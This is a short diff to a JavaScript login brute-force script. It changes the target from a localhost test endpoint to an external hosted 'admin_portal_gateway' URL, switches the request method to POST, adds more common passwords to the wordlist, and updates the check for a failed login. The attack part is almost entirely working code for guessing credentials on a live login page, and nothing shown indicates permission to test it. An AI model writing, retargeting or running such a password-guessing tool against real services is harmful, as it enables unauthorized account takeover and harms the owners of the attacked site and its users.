@@ -1,11 +1,11 @@
 // Developer Comment: Sending username + password to this URL for verification. Change as required. 
-let URL_TO_TEST = "http://127.0.0.1:5000/verify_login"
+let URL_TO_TEST = "http://4mfapythonanywhere.pythonanywhere.com/admin_portal_gateway"
 
 // Developer Comment: Set HTTP request method for contacting server 
-let METHOD_TO_USE = "GET"
+let METHOD_TO_USE = "POST"
 
 // Developer Comment: Passwords to test using brute force. Add more common passwords as required.
-wordlist = ["123456", "12345678", "qwerty"]
+wordlist = ["123456", "12345678", "qwerty", "12345", "123456789", "1234567", "Passw0rd01"]
 
 /////
 
@@ -34,7 +34,7 @@ makeRequest();
 
 xhttp.onreadystatechange = function() {
   if (this.readyState == 4 && this.status == 200) {
-    if (this.responseText.includes("39d9147c-d065-4aba-980e-6f86942c319f")) {
+    if (this.responseText.includes("Login Failed")) {
         console.log(wordlist[i] + " is incorrect")
     }
     else if (this.responseText.includes("e4b2a605-ad6c-45f5-9519-2905fe347b27")) {
